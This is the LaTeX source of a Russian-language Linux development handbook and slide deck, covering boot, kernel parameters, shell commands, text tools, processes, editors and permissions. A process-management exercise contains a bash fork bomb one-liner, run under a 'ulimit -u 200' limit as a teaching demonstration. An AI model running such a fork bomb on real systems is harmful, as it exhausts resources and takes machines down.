%\documentclass[ignorenonframetext, professionalfonts, hyperref={pdftex, unicode}]{beamer}
\documentclass[pdftex,12pt,a4paper]{report}
\usepackage{beamerarticle}

\usetheme{Copenhagen}
\usecolortheme{wolverine}

%Packages to be included
\usepackage{graphicx}

\usepackage[T2A,T1]{fontenc}
\usepackage[utf8]{inputenc}
\usepackage[russian]{babel}
\usepackage{cmap}

%%\usepackage[orientation=landscape, size=custom, width=16, height=9.75, scale=0.5]{beamerposter}

\usepackage{textcomp}

%\usepackage{beamerthemesplit}

\usepackage{ulem}

\usepackage{verbatim}

\usepackage{ucs}

\usepackage{url}

\usepackage{listings}
\lstloadlanguages{bash}

\lstset{escapechar=`,
	extendedchars=false,
	language=sh,
	frame=single,
	tabsize=2, 
	columns=fullflexible, 
%	basicstyle=\scriptsize,
	keywordstyle=\color{blue}, 
	commentstyle=\itshape\color{brown},
%	identifierstyle=\ttfamily, 
	stringstyle=\mdseries\color{green}, 
	showstringspaces=false, 
	numbers=left, 
	numberstyle=\tiny, 
	breaklines=true, 
	inputencoding=utf8,
	keepspaces=true,
	morekeywords={u\_short, u\_char, u\_long, in\_addr}
	}

\definecolor{darkgreen}{cmyk}{0.7, 0, 1, 0.5}

\lstdefinelanguage{diff}
{
    morekeywords={+, -},
    sensitive=false,
    morecomment=[l]{//},
    morecomment=[s]{/*}{*/},
    morecomment=[l][\color{darkgreen}]{+},
    morecomment=[l][\color{red}]{-},
    morestring=[b]",
}

\author[Epam]{{\bf Epam}\\Low Level Programming Department}

%\institution[EPAM]{EPAM}
\logo{\includegraphics[width=1cm]{logo.png}}

\usepackage[unicode=true]{hyperref}
\hypersetup{
    pdfkeywords={Linux},
    bookmarksnumbered=true,
    bookmarksopen=true,
    bookmarksopenlevel=1,
    colorlinks=true,
    pdfstartview=Fit,
    pdfpagemode=UseOutlines,
    pdfpagelayout=TwoPageRight
}

\title{Software development in Linux environment\\Handbook}

\mode<all>{
\usepackage{pgf,tikz}
\usetikzlibrary{babel}

% built files
\definecolor{bfile}{rgb}{.9,0.9,0.9}
% distributed generated files
\colorlet{dgfile}{yellow}
% auto* input file
\colorlet{afile}{green!33}
% tools
\definecolor{tfile}{rgb}{1.0,0.5,0.5}

\tikzstyle{afile}=[draw,fill=afile,shape=rectangle,inner sep=1ex]
\tikzstyle{bfile}=[draw,fill=bfile,shape=rectangle,inner sep=1ex]
\tikzstyle{dgfile}=[draw,fill=dgfile,shape=rectangle,inner sep=1ex]
\tikzstyle{tfile}=[draw,fill=tfile,shape=rectangle,inner sep=1ex]

\newcommand\arr[1][]{\draw[thick,->,#1]}
\def\afile{\node[style=afile]}
\def\bfile{\node[style=bfile]}
\def\dgfile{\node[style=dgfile]}
\def\tfile{\node[style=tfile]}

\newcommand{\filename}[1]{{\color{blue}{\textit{\begingroup \urlstyle{sf}\Url{#1}}}}}
\newcommand{\filenamew}[1]{{{\textit{\begingroup \urlstyle{sf}\Url{#1}}}}}
\newcommand{\command}[1]{\texttt{#1}}

}
\begin{document}

\maketitle

\tableofcontents


\part{Введение}

\chapter{GNU/Linux}
\mode<all>{\begin{frame}{Терминология}
	\begin{itemize}
		\item GNU -- GNU's Not Unix!
		\begin{itemize}
			\item 1983. Ричард Столлман. Свободное ПО.
		\end{itemize}

		\pause

		\item POSIX
		\begin{itemize}
			\item 1988. Portable Operating System Interface for Unix. 
		\end{itemize}

		\pause

		\item Linux
		\begin{itemize}
			\item 1991. Линус Торвальдс. Ядро.
		\end{itemize}

	\end{itemize}
\end{frame}
}
\section{Лицензии}
\mode<all>{\begin{frame}{Лицензии: открытые и свободные}

	\begin{block}{ Р.Столлман: 4 свободы}

		\begin{itemize}
			\item Свобода 0: Свобода запускать программу в любых целях.
			\item Свобода 1: Свобода изучения работы программы и адаптация её к вашим нуждам. 
				Доступ к исходным текстам является необходимым условием.
			\item Свобода 2: Свобода распространять копии,  так что вы можете помочь вашему товарищу.
			\item Свобода 3: Свобода улучшать программу и публиковать ваши улучшения,
				так что всё общество выиграет от этого.
				Доступ к исходным текстам является необходимым условием.
		\end{itemize}
	\end{block}


\end{frame}

\begin{frame}{Copyleft }

	\begin{block}{ \textcopyleft  -- ``Копилефт''}
	Авторское лево -- концепция и практика использования законов авторского права для обеспечения 
	невозможности ограничить любому человеку право использовать,  изменять и распространять как 
	исходное произведение,  так и произведения,  производные от него.
	\end{block}


	При копилефте все производные произведения должны распространяться под той же лицензией,
	что и оригинальное произведение.

\end{frame}


\begin{frame}{Лицензии}
	\begin{itemize}
		\item GPL
		\item LGPL
		\item AGPL
		\item BSD
		\item MIT
		\item Mozilla Public License
		\item Apache Software License
		\item Creative Commons *
	\end{itemize}
\end{frame}
}
\section{Дистрибутивы ОС Linux}
\mode<all>{\begin{frame}{Дистрибутив ОС GNU/Linux}
	\begin{block}{ Определение}
		\only<1>{\center{\bf{?}}}
		\pause
		\only<2->{Набор программного обеспечения на базе ядра Linux, распространяющийся как единое целое.}
	\end{block}
\end{frame}


\begin{frame}{Задачи дистрибутива}
	\begin{itemize}
		\item Предоставление комплекта ПО (ядро + утилиты)
		\item Средства установки и настройки
		\item Средства обновления
	\end{itemize}
\end{frame}

\begin{frame}{Различия между дистрибутивами}

	\only<1>{\Large\center{\bf{?}}}
	\pause
	\only<2->{\Large\center{\bf{Цели!!!}}}

	\bigskip
	\normalsize

	\pause

	\begin{itemize}
		\begin{columns}
		\column{0.4\textwidth}
			\item Инсталлятор
			\item Первичные настройки
			\item Средства управления
			\item Набор ПО
		\column{0.4\textwidth}
			\item Менеджер пакетов
			\item Формат распространения ПО
			\item Пути к файлам
			\item Система сборки ПО
		\end{columns}
	\end{itemize}
\end{frame}

\begin{frame}{Дистрибутивы}
	\begin{itemize}
		\begin{columns}
		\column{0.3\textwidth}
			\item RedHat
			\item Fedora Core
			\item CentOS
			\item Scientific Linux
			\item Oracle Unbreakable Linux
		\column{0.3\textwidth}
			\item Slackware 
			\item Gentoo
			\item Arch
			\item OpenSUSE
			\item ALT Linux 
		\column{0.3\textwidth}
			\item Debian
			\item Ubuntu
			\item Mint
			\item Knoppix
			\item BackTrack
		\end{columns}
	\end{itemize}
\end{frame}
}

\chapter{Процесс загрузки ОС Linux}
\mode<all>{\begin{frame}{Процесс загрузки GNU/Linux}
	\scriptsize
	\begin{enumerate}
		\item BIOS
		\item MBR
			\pause
		\item Загрузка загрузчика
		\begin{itemize}
		\footnotesize
			\item Stage 1 -- Первичный загрузчик
			\item Stage 1,5 -- Загрузка ядра загрузчика и драйвера ФС
			\item Stage 2 -- Чтение конфигурации
		\end{itemize}
			\pause

		\item Загрузка ядра в память
		\item Загрузка initrd в память
			\pause
		\item Передача управления ядру
		\begin{itemize}
		\footnotesize
			\item Распаковка
			\item Инициализация
		\end{itemize}

		\item Монтирование initrd
		\item Запуск программы инициализации в initrd
			\pause
		\item Нахождение и монтирование корневого раздела
			\pause
		\item Запуск программы init
		\begin{itemize}
		\footnotesize
			\item Монтирование оставшихся разделов ФС
			\item Инициализация оборудования
			\item Запуск демонов
		\end{itemize}

	\end{enumerate}
\end{frame}


\begin{frame}{Наиболее распространенные загрузчики}
	\begin{itemize}
		\item GRUB
		\item LILO
		\item syslinux (isolinux, pxelinux)
		\item u-boot
	\end{itemize}
\end{frame}
}
\section{Ядро Linux}
\mode<all>{\begin{frame}{Задачи ядра Linux}
	\begin{itemize}
		\item Инициализация системы
		\item Управление процессами и потоками
		\item Управление памятью
		\item Управление файлами
		\item IPC
		\item Разграничение доступа
		\item Сетевые возможности
		\item Интерфейс доступа к возможностям ядра
	\end{itemize}
\end{frame}


\begin{frame}{Ядро}

	Ядро ОС Linux является модульным. 

	\begin{block}{Модули}
		\begin{itemize}
			\item В виде отдельных файлов
			\item "Вкомпилированные" в ядро
		\end{itemize}
	\end{block}

	\bigskip

	Список загруженных модулей: {\tt /proc/modules}
\end{frame}


\begin{frame}{Параметры ядра}
	
	Полный список: {\tt Documentation/kernel-parameters.txt}

	\begin{block}{Некоторые часто применяемые параметры}
		\begin{itemize}
			\begin{columns}
			\column{0.3\textwidth}
				\item console=ttyS0,115200
				\item debug
				\item init=/sbin/init
				\item loglevel=[0-7]
				\item maxcpus=[num]
			\column{0.3\textwidth}
				\item mem=nn[KMG]
				\item noacpi
				\item noapic
				\item panic=nn (sec)
				\item resume=/dev/sda2
			\column{0.3\textwidth}
				\item ro
				\item rw
				\item root=/dev/sda1
				\item rootdelay=nn (sec)
				\item rootwait
				\item vga=<num>|ask
			\end{columns}
		\end{itemize}
	\end{block}

	Модулям можно передавать параметры используя синтаксис: {\tt module.param=value}

	Параметры переданные ядру во время загрузки: {\tt /proc/cmdline}
\end{frame}

\begin{frame}{Магия SysRq}

	{\tt CONFIG\_MAGIC\_SYSRQ=y}

	{\tt /proc/sysrq-trigger}

	\begin{block}{{\bf R}eboot {\bf E}ven {\bf I}f {\bf S}ystem {\bf U}tterly {\bf B}roken}
		{\bf Ctrl+Alt+SysRq+?}

		\begin{itemize}
			\item h -- вывести список сочетаний на консоль
			\item b -- перезагрузка
			\item o -- выключение
			\item e -- послать сигнал SIGTERM всем процессам кроме init
			\item i -- послать сигнал SIGKILL всем процессам кроме init
			\item s -- синхронизировать все ФС 
			\item u -- переподключить все ФС в режиме RO
		\end{itemize}
		
	\end{block}


\end{frame}
}
\section{Userspace}
\mode<all>{\begin{frame}{initrd}

	Система первичной загрузки.

	\begin{block}{Задача}
		Основная задача -- подготовить и проинициализировать
		устройство, на котором располагается корневая ФС.
	\end{block}
\end{frame}
}
\mode<all>{\begin{frame}{init}
	Менеджер управления работой системой и сервисами.
	
	\bigskip

	\center{\large PID = 1}

	\bigskip

	\begin{block}{Наиболее известные}
		\begin{itemize}
			\item SysVInit
			\item systemd
			\item upstart
		\end{itemize}
	\end{block}
\end{frame}
}
\section{Практика}
\mode<all>{\begin{frame}{Практическое задание}
	\begin{enumerate}
		\item Загрузить ОС по умолчанию
		\item Посмотреть используемые параметры ядра 
		\item Посмотреть список загруженных модулей
			\pause
		\item Переопределить init на sh
		\item SysRq. {\bf R}eboot {\bf E}ven {\bf I}f {\bf S}ystem {\bf U}tterly {\bf B}roken
			\pause
		\item Загрузить ядро с "урезанным" количеством памяти
		\item Отключить 1 или несколько процессоров
			\pause
		\item Посмотреть текущий runlevel
		\item Посмотреть список сервисов
	\end{enumerate}
\end{frame}
}

\chapter{Файловая структура}
\mode<all>{\begin{frame}{Файловая структура}
	
	{\center "Дерево внутри дома?" (c) Шрек}
		
	\begin{columns}
	\column{0.2\textwidth}
		\includegraphics[height=0.8\textheight]{../../slides/fs/01-lhs.png}
	\column{0.7\textwidth}
		\begin{itemize}
			\item Директории
			\item Обычные файлы
			\item Симлинки
			\item Хардлинки
			\item Файлы устройств
			\item FIFO
			\item сокеты
		\end{itemize}
	\end{columns}
\end{frame}
}

\chapter{Командная строка}
\mode<all>{\begin{frame}[fragile]{Определение(не совсем формальное)}
	\textbf{Shell} -- приложение, обеспечивающее выполнение других приложений и их взаимодействие, а также представляющая услуги командной строки. 
	\begin{center}
	 или
	\end{center}
	\textbf{Shell} -- приложение, обеспечивающее доступ к основным функциям ядра.

	\pause
	\vspace{0.5in}
	Пример shell из Windows-world -- cmd.exe
	\vspace{0.5in}

	Минимальный дистрибутив Linux -- ядро + shell 

\end{frame}

\begin{frame}[fragile]{Основные типы shell в Unix}
  \begin{itemize}
    \item Bourne shell совместимые
      \begin{itemize}
        \item \textbf{sh} исходная bourne shell (Steve Bourne, 1978)
        \item \textbf{ksh} Korn shell (David Korn, 1983)
        \item \textbf{ash} $[$BSD$]$ Almquist shell (Kenneth Almquist,1989)  
        \item \textbf{bash} $[$GPL$]$ Bourne-again shell (Brian Fox, 1989)
        \item \textbf{zsh} $[$BSD$]$ Z shell (Paul Falstad,1990)
        \item \textbf{/bin/sh} Указывает на POSIX-совместимую shell
      \end{itemize}
  \item C shell совместимые
      \begin{itemize}
        \item \textbf{csh}  Исходная С shell (Bill Joy, 1978)
        \item \textbf{tcsh} $[$BSD$]$ TENEX C shell (Ken Greer, 1981)
       \end{itemize}
  \end{itemize}
\end{frame}

\begin{frame}[fragile]{Маленькое упражнение}
\begin{lstlisting}[language=bash]
cat /etc/shells
ls -l <filename> # для каждого элемента /etc/shells
readlink -e <filename> 
\end{lstlisting}
\end{frame}


}
\section{Работа в командной строке}
\mode<all>{\begin{frame}[fragile]{Получение помощи}
  \begin{itemize}
    \pause
    \item \textbf{man} - помощь по внешним командам
    \pause
    \item \textbf{help} - помощь по внутренним командам bash (также man bash)
    \pause
    \item \textbf{info} - расширенная помощь по некоторым командам (texinfo format)
      \begin{itemize}
       \item   Попробовать {\tt info coreutils}
       \item   Справка по навигации -- нажать h
      \end{itemize}
  \end{itemize}
\end{frame}

\begin{frame}[fragile]{Основное о man}
\begin{columns}
	\column{2.2in}
		\begin{itemize}
			\item Прочитайте {\tt man man} !
			\item Apropos {\tt man -k <слово>}
			\item Разделы (sections)
				\begin{itemize}
					\item[1] Основная секция(юзерские программы)
					\item[2] Syscalls
					\item[3] С library
					\item[5] Конфигурационные файлы
					\item[8] Системные службы
				\end{itemize}
		\end{itemize}
	  \textbf{Замечание}

	  Обычно внутри страницы работает поиск с помощью '/'
	\pause 
	
	\column{1in}
		\begin{block}{Попробовать}
			\begin{lstlisting}
man -k printf
man 3 printf
man 1 printf
man -a printf
			\end{lstlisting}
		\end{block}
	\end{columns}
\end{frame}


}
\mode<all>{\begin{frame}{Навигация по файловой системе}
      \begin{itemize}
		  \item {\tt ls} -- список файлов в (текущей по умолчанию) директории (man ls)
		  \item {\tt cd} -- смена текущей директории (help cd)
		  \item {\tt pwd} -- имя текущей директории (help pwd)
      \end{itemize}
\end{frame}

\begin{frame}[fragile]{Команды для работы с файлами}
	\begin{itemize}
		\begin{columns}
		\column{0.2\textwidth}
			\item touch
			\item ln
			\item mkdir
			\item mknod
			\item mkfifo
		\column{0.2\textwidth}
			\item cp
			\item mv
			\item install
			\item rm
			\item rmdir
			\item file
		\column{0.4\textwidth}
			\begin{block}{Упражнение}
				\begin{enumerate}
					\item Создать иерархию директорий
						\begin{lstlisting}
dir1/dir1.1/dir1.1.1
dir1/dir1.2/dir1.2.1
dir1/dir1.2/dir1.2.2
						\end{lstlisting}
					\item Внутри каждой создать файл
					\item Удалить все созданное
				\end{enumerate}
			\end{block}
		\end{columns}
	\end{itemize}
\end{frame}


}
\mode<all>{\begin{frame}{Важные аббревиатуры внутри командной строки}
  \begin{itemize}
    \item Для директорий
      \begin{itemize}
        \item {\tt $\sim$} Домашняя директория
        \item {\tt $\sim$<username>} Домашняя директория пользователя
        \item {\tt ..} Родительская директория
        \item {\tt .} Текущая директория
      \end{itemize}
      \pause  
    \item Wildcards
      \begin{itemize}
        \item {\tt *} Любой набор символов {\tt file*txt : file1.txt filefilefiletxt}
        \item {\tt $[$<список>$]$ } символ из заданного набора
        \item {\tt ?} любой один символ
      \end{itemize}

  \end{itemize}
\end{frame}       

\begin{frame}{Горячие клавиши}
  \begin{itemize}
    \item \textbf{Tab} -- дополнение текущей команды
      \pause
    \item История команд
      \begin{itemize}
        \item Клавиши курсора -- навигация по истории
        \item Ctrl-R -- поиск в истории по фрагменту
        \item Ctrl-O (после выполнения вставить следующую команду из истории)
        \item Команда {\tt history}
      \end{itemize}
    \item Навигация

  \end{itemize}
\end{frame}

\begin{frame}{Переменные окружения}
  \begin{itemize}
    \item {\tt HOME}
    \item {\tt PWD}
    \item {\tt LANG}
    \item {\tt LD\_LIBRARY\_PATH}
    \item {\tt SHELL}
    \item {\tt TERM}
    \item {\tt DISPLAY}
  \end{itemize}

  Контроль

  \begin{itemize}
    \item export {\tt export VAR=value}
    \item declare -x
    \item echo 
  \end{itemize}

  Переменные окружения наследуются при создании нового процесса
\end{frame}

%\begin{frame}{Настройки bash и кастомизация}
%  \begin{itemize}
%    \item Login shell
%      \begin{itemize}
%        \item {\tt /etc/profile}
%        \item {\tt $\sim$/.profile }
%      \end{itemize}
%    \item Обычная интерактивная shell
%      \begin{itemize}
%        \item {\tt /etc/bash.bashrc}
%        \item {\tt $\sim$/.bashrc}
%      \end{itemize}
%  \end{itemize}
%
%  Полезные команды
%  \begin{itemize}
%    \item {\tt alias}
%    \item {\tt export PATH=}
%    \item {\tt Определение функции}
%    \item {\tt shopts}
%  \end{itemize}
%
%\end{frame}


}
\mode<all>{\begin{frame}{Дополнительный набор команд}
  \begin{itemize}
    \item {\tt cat} - Вывод файла в stdout, соединение нескольких файлов в stdout
    \item {\tt wc} - подсчет статистики символов в файле или в stdin 
    \item {\tt sort} - сортировка строк файла
    \item {\tt uniq} - объединение одинаковых строк в одну
    \item {\tt tr} - замена набора символов
    \item {\tt less} - программа-пейджер
    \item {\tt grep} - поиск строк, соответствующих регулярному выражению
    \item {\tt cut} - выделение полей из строк stdin
    \item {\tt awk} - небольшой язык программирования (также полезен для выделения полей)
  \end{itemize}
\end{frame}

\begin{frame}[fragile]{Некоторые примеры использования}
\begin{lstlisting}[language=bash]
cat /proc/1/environ | tr '\0' '\n' | less
ls  | wc -l # подсчет числа файлов
man uniq | tr  '[:space:]' '\n' | sort | uniq -c | sort -n | less # подсчет количества слов в тексте man uniq
history | wc -l # подсчет ранее введенных команд
cat /etc/udev/rules.d/* | wc -l
ls -s *.jpg | awk 'BEGIN{s=0};/^[ ]*[0-9]/{s+=`\$1`};END{print s}' 
\end{lstlisting}
  \pause
  \begin{block}{Упражнение}
    Посчитать статистику использования команд в history
  \end{block}
\end{frame}

\begin{frame}{Дополнительный набор команд для работы с текстом}
	\begin{itemize}
	  \item {\tt head} -- вывести первые строки
	  \item {\tt tail} -- вывести последние строки
		\begin{itemize}
			\item {\tt -f} -- отслеживать добавление данных в файл 
		\end{itemize}
	  \item {\tt tee} -- копировать стандартный вывод в файл
	  \item {\tt grep} -- печать текста, соответствующего шаблону
		\begin{itemize}
			\item {\tt -i}	
			\item {\tt -v}
			\item {\tt -o}
		\end{itemize}
	\end{itemize}
\end{frame}

}
\mode<all>{\begin{frame}{Архивация}
	\begin{block}{Архивация: tar}
		\begin{itemize}
			\item {\tt -c} -- создать архив
			\item {\tt -x} -- извлечь из архива
				\begin{itemize}
					\item {\tt -C} -- перейти в директорию
				\end{itemize}
			\item {\tt -f} -- запись в файл
		\end{itemize}
	\end{block}

	\begin{block}{Сжатие: gzip, bzip, xz}
		\begin{itemize}
			\item {\tt -[1-9]} -- изменить уровень сжатия
			\item {\tt -d} -- распаковать
			\item {\tt -c} -- вывод на консоль
		\end{itemize}
	\end{block}
\end{frame}

\begin{frame}[fragile]{Архивация: примеры}

	Создать сжатый архив:
	\begin{verbatim}
tar -czf archive.tar.gz *
	\end{verbatim}
	\pause
	Распаковать сжатый архив в директорию {\tt /tmp}:
	\begin{verbatim}
tar -C /tmp/ -xzf archive.tar.gz 
	\end{verbatim}
	\pause
	Создать сжатый архив:
	\begin{verbatim}
tar -czf archive.tar.gz *
	\end{verbatim}
	\pause
	Создать копию текущей директории в директории {\tt /tmp/copy/}:
	\begin{verbatim}
tar -c * | tar -C /tmp/copy -x
	\end{verbatim}
	\pause
	Создать копию текущей директории на другом хосте:
	\begin{verbatim}
HostDest: netcat -l 2222 | gzip -dc | tar -C /tmp/copy/ -x
HostSrc:  tar -c * | gzip -9 | netcat HostDest 2222
	\end{verbatim}
\end{frame}

\begin{frame}[fragile]{Поиск файлов}
	\begin{block}{find}
		\begin{itemize}
			\item {\tt -type} -- тип файлового объекта
			\item {\tt -size} -- размер
			\item {\tt -maxdepth} -- глубина рекурсии
			\item {\tt -exec} -- выполнить команду
			\item {\tt -printf} -- форматированный вывод
		\end{itemize}
	\end{block}

	\begin{block}{Примеры}
		\begin{verbatim}
find /etc -type f -size +100k  -exec ls -l {} \;
		\end{verbatim}

		\begin{verbatim}
find -type d -user altlinux
		\end{verbatim}
	
	\end{block}
\end{frame}

\begin{frame}[fragile]{xargs}
	\begin{block}{xargs}
			Утилита для создания и запуска команд из стандартного потока ввода:
		\begin{verbatim}
xargs [options] command [command options]
		\end{verbatim}
	
	\end{block}

	\begin{block}{Примеры}
		\begin{verbatim}
find /etc -type f -size -100k | xargs tar -czf /tmp/archive-100k.tar.gz
		\end{verbatim}

		\begin{verbatim}
find /etc -type f | xargs -I {} echo "Найден {} файл"
		\end{verbatim}
	
	\end{block}
\end{frame}


}
\mode<all>{\begin{frame}{Перенаправления в файл}

\begin{itemize}
  \item Перенаправление stdout 
    \begin{itemize}
      \item С созданием нового файла

        {\tt command > file}\\
		Например {\tt cat file1 file2 > file3}
      \item С дополнением существующего

		  {\tt command >\phantom{}>  file}
    \end{itemize}
    \pause
  \item Перенаправления stdin

    {\tt command < file}
    \pause
  \item Перенаправления stderr

    {\tt command1 2>\&1 | command2}

   {\tt command 1>file 2>\&1}

   {\tt command 2>file 1>\&2}
\end{itemize}

\end{frame}


}


\section{Взаимодействие процессов}
\mode<all>{\begin{frame}{Процессы в UNIX}
  \begin{itemize}
    \item Создание процессов
      \begin{itemize}
        \item fork
        \item exec
      \end{itemize}
    \item Атрибуты процесса
      \begin{itemize}
        \item pid 
        \item файловые дескрипторы
        \item environment
        \item Рабочая директория (cwd)
        \item прочее в директории {\tt /proc/<pid>}
      \end{itemize}
  \end{itemize}
\end{frame}

\begin{frame}{Управление процессами}
  \begin{itemize}
    \item kill (killall)
    \item top
    \item pstree
    \item Команды управления процессами в bash: 
      \begin{itemize}
        \item {\tt jobs}, {\tt fg, \tt bg}
        \item Ctrl-C -- оборвать выполнение процесса (SIGINT)
        \item Ctrl-Z -- остановить выполнение команды (SIGTSTP)
        \item Ctrl-D -- завершить ввод
      \end{itemize}
  \end{itemize}
\end{frame}


\begin{frame}{Упражнения}
  \begin{block}{Посмотреть вывод pstree}
    {\tt pstree}
  \end{block}
  \pause
  \begin{block}{Ctrl-C, Ctrl-Z}
    В графическом режиме запустить из терминала emacs

    Ctrl-Z

    jobs -l

    bg +
  \end{block}
  \pause
  \begin{block}{fork bomb}

    {\tt ulimit -u 200} 

    {\tt bomb()\{ (bomb; bomb) \& \} }

    top

    killall bash

  \end{block}
\end{frame}


\begin{frame}{Unix way}
  \begin{enumerate}
    \item Пишите программы, которые делают одну вещь и делают её хорошо.
    \item Пишите программы, которые бы работали вместе.
    \item Пишите программы, которые бы поддерживали текстовые потоки, поскольку это универсальный интерфейс. 
  \end{enumerate}
\end{frame}

\begin{frame}{Unix way}
  \begin{enumerate}
    \item   Маленькое прекрасно.
    \item   Пусть каждая программа делает одну вещь, но хорошо.
    \item   Собирайте прототип как можно раньше.
    \item   Предпочитайте переносимость эффективности.
    \item   Храните данные в простых текстовых файлах.
    \item   Используйте программные рычаги для достижения цели.
    \item   Используйте сценарии командной строки для улучшения функционала и переносимости.
    \item   Избегайте <<связывающего>> (captive) пользовательского интерфейса.
    \item   Делайте каждую программу «фильтром».
  \end{enumerate}
\end{frame}

\begin{frame}{Конвееры}
%  \textbf{Цель} -- максимальная модульность: большое количество простых приложений, взаимодействующих друг с другом для решения задач
  \only<1>{
  \begin{center}
    \includegraphics[width=1.2in]{../../slides/cmdline/process}
  \end{center}
  }
  \only<2>{
    \begin{center}
      \includegraphics[width=3.6in]{../../slides/cmdline/processes}
    \end{center}
  }
  \begin{itemize}
    \item <1-> Каждое приложение открывает 3 стандартных файловых дескриптора stdin (fd 0), stdout(fd 1), stderr (fd 2)
    \item <2-> Приложения могут работать как фильтр из STDIN в STDOUT, можно объединять несколько приложений в конвейер
    \item <2-> Синтаксис {\tt <app1> | <app2>}
  \end{itemize}
\end{frame}
}

\chapter{Редакторы}
\section{Потоковые редакторы}
\mode<all>{\begin{frame}{Редакторы}
	\begin{itemize}
		\item Интерактивные
			\begin{itemize}
				\item vi
					\begin{itemize}
						\item Есть почти везде
					\end{itemize}
				\item vim
				\item emacs
			\end{itemize}
		\item Поточные
			\begin{itemize}
				\item {\tt ed}
				\item {\tt sed}
				\item {\tt awk}
			\end{itemize}
	\end{itemize}
\end{frame}

\begin{frame}[fragile]{Метасимволы}
	\begin{block}{grep, sed, awk}
	\end{block}
	\begin{itemize}
		\item {\tt .} -- любой символ за исключением пустой строки
		\item {\tt *} -- любоe количество символов, которые стоят перед {\tt *}
		\item {\tt \^{}} -- начало строки
		\item {\tt \$} -- конец строки
		\item {\tt [...]} -- любой символ из заключенных в скобки
	\end{itemize}
\end{frame}

\begin{frame}[fragile]{sed}
	\begin{block}{Сценарии}
		{\tt [ addr [ ,  addr ] ] cmd [ args ]}
	\end{block}

	\tiny
	\begin{block}{Команды}
		\begin{itemize}
		  \item {\tt a, i} -- добавить строку после (перед) текущей
			  \begin{verbatim} who | sed -e 'a Text' \end{verbatim}
		  \item {\tt c} -- удалить строку и заменить на текст
			  \begin{verbatim} who | sed -e "/$USER/ c Юзверь" \end{verbatim}
		  \item {\tt d} -- удалить строку
			  \begin{verbatim} who | sed -e '2,4 d' \end{verbatim}
			  \begin{verbatim} who | sed -e '/pts/ d' \end{verbatim}
		  \item {\tt s} -- замена по регулярному выражению
			  \begin{verbatim} who | sed -e "s/$USER/Юзверь/g" \end{verbatim}
		\end{itemize}
	\end{block}
	\pause
	\begin{block}{Задача}
		С помощью {\tt find} найти все вложенные директории в {\tt /etc} и 
		''переделать'' их в windows-style
	\end{block}
\end{frame}


}
\section{Vim}
\mode<all>{\begin{frame}{VI}
	\begin{block}<1>{Два режима работы}
		\begin{itemize}
			\item все портить
			\item бибикать
		\end{itemize}
	\end{block}
	\pause
	\begin{block}<2->{Два режима работы}
		\begin{itemize}
			\item командный 
			\item текстового ввода
		\end{itemize}
	\end{block}

	\begin{block}<2->{Переход между режимами}
		\begin{itemize}
			\item из командного в текстовый: i, a, R (вставка, добавление, замена)
			\item из текстового в командный: ESC или Ctrl-[
		\end{itemize}
	\end{block}

\end{frame}

\begin{frame}{VI: command mode}

	\begin{block}{Перемещение курсора}
		\begin{itemize}
			\item h, j, k, l -- влево, вниз, вверх, вправо (1 элемент)
			\item \^{} или 0 -- в начало строки
			\item \$ -- в конец строки
			\item w, b -- вперед, назад на слово
			\item gg, G -- начало, конец текста (<num>G -- на строку <num>)
		\end{itemize}
	\end{block}

	\begin{block}{Редактирование}
		\begin{itemize}
			\item d -- удалить (d -- текущую строку, w -- слово)
			\item u -- отмена предыдущего изменения
			\item . -- повтор
		\end{itemize}
	\end{block}
\end{frame}

\begin{frame}{VI: command mode}

	\begin{block}{Работа с неименованым буфером}
		\begin{itemize}
			\item y -- удалить (d -- текущую строку, w -- слово)
			\item p -- вставить из буфера
		\end{itemize}
	\end{block}

	\begin{block}{Командная строка}
		: -- переход в режим командной строки
		\begin{itemize}
			\item :q или :q! -- выход без сохранения
			\item :w -- сохранить изменения
			\item :x -- выйти с сохранением (:wq)
		\end{itemize}
	\end{block}
\end{frame}

\begin{frame}{Задание на дом}
\begin{block}{}
vimtutor ru
\end{block}
\end{frame}


}

\section*{Упражнения}
\mode<all>{\begin{frame}[fragile]{Практика: работа с текстовыми файлами}
  \begin{enumerate}
	  \item Посмотреть вывод команды {\tt dmesg}
	  \item Вывести на экран первые 10 строк 
		  \pause
	  \item Создать директорию в {\tt /tmp} и перейти в нее
	  \item Скопировать в файл1 последние 100 строк из {\tt /var/log/messages}
	  \item Запустить отслеживание изменений в файле1 на отдельной консоли
	  \item Дописать в файл1 из файла {\tt /etc/services}) все строки,
		  содержащие слова {\tt mail} или {\tt cache}
		  \pause
	  \item Запустить отслеживание изменений одновременно в файле1 и в {\tt /var/log/messages}\\
		  \pause
			повторить предыдущий пункт, убрав все комментарии при помощи {\tt sed}\\
		  \pause
		  ... и добиться параллельного вывода результатов на экран и во временный файл
	  \item
  \end{enumerate}
\end{frame}

\begin{frame}{Практика: работа с файловыми объектами}
	\begin{enumerate}
		\item Cкопировать файл1 в файл2
			\pause
		\item Добиться того, чтобы файл2 состоял из 3 одинаковых копий файла1
		\item Создать жесткую ссылку на файл1
		\item Создать символическую ссылку на файл2
		\item Вывести на экран список всех файлов
			\pause
		\item Добавить вывод команды {\tt date} в файл1
		\item Вывести на экран список всех файлов
		\item Вывести на экран содержимое файла1 и жесткой ссылки
		\item Создать именованный канал (PIPE)
		\item Запустить одну команду {\tt cat} на чтение из PIPE
		\item Записать содержимое файла1 и файла2 в PIPE
		\item Удалить временную директорию
	\end{enumerate}
\end{frame}


}

\chapter{Механизмы разделения привилегий}

\mode<all>{\begin{frame}{Многопользовательская модель}   
 \begin{itemize}
   \item Linux -- многопользовательская система
   \item Привилегии пользователей
     \begin{itemize}
       \item root
       \item other users
      \end{itemize}
     \end{itemize}
\end{frame}

%\section{Механизмы разделения привилегий}
%\subsection{Классический UNIX}

\begin{frame}{Пользователи, группы и файлы}
\begin{itemize}
  \item Каждый пользователь принадлежит одной или нескольким \textbf{группам}
  \item Каждый файл и директория принадлежит
    \begin{itemize}
      \item Одному пользователю 
      \item Одной группе
    \end{itemize}
  \pause
  \item  Разрешения что либо делать с файлом определяются по отношению к
    \begin{enumerate}
      \item Пользователю-владельцу файла
      \item Группе владеющей файлом
      \item Всем остальным пользователям
    \end{enumerate}

\end{itemize}
\pause
\begin{columns}
  \column{0.48\textwidth}
  \begin{itemize}
    \item {\tt ls -l} 3,4 поле 
    \item {\tt groups}
   \end{itemize}
  \column{0.48\textwidth}
  \begin{block}{Попробовать}
    {\tt ls -l /usr/bin/}

    {\tt groups}

    {\tt groups root}
  \end{block}
\end{columns}
\end{frame}


}
\mode<all>{\begin{frame}{Типы разрешений для файлов}
	\begin{columns}
		\column{0.48\textwidth}
		\begin{center}
			\textbf{Разрешения для файла}
		\end{center}
		\begin{itemize}
			\item Три типа разрешений
				\begin{enumerate}
					\item чтение read(r)
					\item запись write(w)
